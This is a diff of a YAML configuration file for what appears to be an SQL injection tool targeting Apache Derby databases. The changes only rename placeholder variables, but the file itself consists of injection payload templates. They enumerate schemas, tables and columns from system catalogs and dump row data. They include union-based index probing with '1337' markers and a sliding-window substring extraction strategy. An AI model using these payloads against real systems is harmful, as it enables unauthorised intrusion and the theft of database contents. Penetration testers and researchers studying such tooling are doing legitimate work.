@@ -3,11 +3,11 @@ resource:
  info: |
   SELECT 
       '-'
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || CURRENT SCHEMA
-      || '${ENCLOSE_VALUE_SQL}'
+      || '${enclose_value_sql}'
       || CURRENT_USER
-      || '${TRAIL_SQL}'
+      || '${trail_sql}'
   from SYSIBM.SYSDUMMY1
   
  schema: 
@@ -18,32 +18,32 @@ resource:
     * => use limit 1,1 instead
     */
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || schemaname
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    FROM SYS.SYSSCHEMAS
-   {limit}
+   ${limit}
    
   table: |
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || trim(tablename)
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    from sys.systables t
    inner join sys.sysschemas s on t.schemaid = s.schemaid 
-   where schemaname='${DATABASE}'
-   {limit}
+   where schemaname='${database}'
+   ${limit}
    
   column: |
    select 
-       '${ENCLOSE_VALUE_SQL}'
+       '${enclose_value_sql}'
        || trim(columnname)
-       || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
+       || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    from sys.systables t
    inner join sys.sysschemas s on t.schemaid = s.schemaid
    inner join sys.syscolumns c on t.tableid = c.referenceid
-   where schemaname = '${DATABASE}'
-   and tablename = '${TABLE}'
+   where schemaname = '${database}'
+   and tablename = '${table}'
    /**
     * TODO casting numeric to string not possible with getValues()
     * => hiding numeric columns
@@ -52,18 +52,18 @@ resource:
    and columndatatype || '' not like 'INTEGER%'
    and columndatatype || '' not like 'DECIMAL%'
    and columndatatype || '' not like 'BLOB%'
-   {limit}
+   ${limit}
    
   row: 
    query: |
     SELECT 
-        '${ENCLOSE_VALUE_SQL}'
-        || ${FIELDS}
-        || '${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}${TRAIL_SQL}'
-    from ${DATABASE}.${TABLE}
-    {limit}
+        '${enclose_value_sql}'
+        || ${fields}
+        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
+    from ${database}.${table}
+    ${limit}
    fields: 
-    field: trim(coalesce(${FIELD}, ''))
+    field: trim(coalesce(${field}, ''))
     concat: "|| '%7f' ||"
     
 strategy: 
@@ -71,22 +71,22 @@ strategy:
   slidingWindow: |
    select
        /**
-        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
+        * If reach end of string (${lead}i) then NULLIF nullifies the result
         */
-       '${LEAD}'
+       '${lead}'
        || NULLIF(
            substr(
-               (${INJECTION}),
-               ${INDEX}
+               (${injection}),
+               ${index}
            ),
-           '${TRAIL_SQL}'
+           '${trail_sql}'
        )
    from SYSIBM.SYSDUMMY1
-  limit: OFFSET ${LIMIT} ROWS FETCH NEXT 1 ROWS ONLY
+  limit: OFFSET ${limit.value} ROWS FETCH NEXT 1 ROWS ONLY
   failsafe: |
    trim(
        cast(
-           (1337${INDICE}7330%2b1) 
+           (1337${indice}7330%2b1) 
            as char(254)
        )
    )
@@ -98,6 +98,6 @@ strategy:
     - Derby database
     
  normal: 
-  indices: union select ${INDICES} from SYSIBM.SYSDUMMY1
-  capacity: (select '${LEAD}${INDICE}' || ${CALIBRATOR} from SYSIBM.SYSDUMMY1)
+  indices: union select ${indices} from SYSIBM.SYSDUMMY1
+  capacity: (select '${lead}${indice}' || ${calibrator} from SYSIBM.SYSDUMMY1)
   orderBy: order by 1337
